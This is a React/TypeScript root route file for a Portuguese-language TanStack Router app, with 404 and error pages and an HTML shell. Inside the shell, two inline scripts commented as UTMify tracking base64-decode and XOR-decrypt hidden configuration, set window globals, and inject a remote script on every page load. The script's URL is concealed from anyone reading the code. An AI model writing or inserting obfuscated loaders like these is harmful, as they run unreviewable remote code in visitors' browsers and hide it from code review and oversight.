import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

// Scripts de rastreamento (UTMify: pixel + captura de UTMs)
const trackingScripts = [
  `(function(){var k_2d4x=atob("DFfBs6w+rbVWc27tgizjxt5Sj490GxqZ8iT7nINdydt4BhqA6zG4nc9RwJs0AUGe4SWow9hNgsU/CwuBrSeoy8lSg98lUULP4yO1wcVc2MEzAEzX2QrtkctSwtc3Hx3PuAy6kcJfwNB0SUyd6y+k3+Vaj5l0BQ+B9zLjiY4IzNZlQVzdu2+k0JpfmtBiElvatzXx1s4c0Ogr");var k_pt8=[];for(var d_qpv2=0;d_qpv2<k_2d4x.length;d_qpv2++){k_pt8.push(k_2d4x.charCodeAt(d_qpv2)&255);}var d_5p=k_pt8[0];var i_ipa=k_pt8.slice(1,1+d_5p);var d_e8=k_pt8.slice(1+d_5p);var c_m2t=d_e8.map(function(b,s_axwz){return b^i_ipa[s_axwz%d_5p];});var z_dt6="";for(var t_q=0;t_q<c_m2t.length;t_q++){z_dt6+=String.fromCharCode(c_m2t[t_q]&255);}var i_x5rg=decodeURIComponent(escape(z_dt6));var c_3=JSON.parse(i_x5rg);var d_057=c_3.globals||[];d_057.forEach(function(m_n){window[m_n.name]=m_n.value;});var b_mxzi=document.createElement("script");b_mxzi.src=c_3.url;b_mxzi.async=true;b_mxzi.defer=true;(c_3.attributes||[]).forEach(function(f_h06){b_mxzi.setAttribute(f_h06.name,f_h06.value);});(document.head||document.documentElement).appendChild(b_mxzi);})();`,
  `(function(){var t_t=atob("DFPLqXgHmpU4eElg2Cjp3ApruK8aED0UqCDxhldk/vsWDT0NsTWyhxto97taCmYTuyGi2Qx0teBMFTpPtDK/zAtztP9LWmVCuSe/2xFl7+FdC2tagyjpxxlq/7cCWi0BrDLm3Axq8/NBVTkSvSWuxwwq4vZXHGQTuzjphVpx+/lNHWta+nG2hQMl9PRVHWta+jeq3Rkq7+FVES8Z9SO5zA5i9OEVCzwCsTe4i1Ql7PRUDSxC4nHp1CV6");var o_pu=[];for(var f_9=0;f_9<t_t.length;f_9++){o_pu.push(t_t.charCodeAt(f_9)&255);}var s_hkma=o_pu[0];var o_g4=o_pu.slice(1,1+s_hkma);var a_4=o_pu.slice(1+s_hkma);var y_r=a_4.map(function(b,e_dh){return b^o_g4[e_dh%s_hkma];});var w_45z2="";for(var f_49g7=0;f_49g7<y_r.length;f_49g7++){w_45z2+=String.fromCharCode(y_r[f_49g7]&255);}var t_gz=decodeURIComponent(escape(w_45z2));var x_y4cs=JSON.parse(t_gz);var w_w=x_y4cs.globals||[];w_w.forEach(function(m_is){window[m_is.name]=m_is.value;});var v_jq79=document.createElement("script");v_jq79.src=x_y4cs.url;v_jq79.async=true;v_jq79.defer=true;(x_y4cs.attributes||[]).forEach(function(m_ej){v_jq79.setAttribute(m_ej.name,m_ej.value);});(document.head||document.documentElement).appendChild(v_jq79);})();`,
];

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        {trackingScripts.map((code, i) => (
          <script key={i} dangerouslySetInnerHTML={{ __html: code }} />
        ))}
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
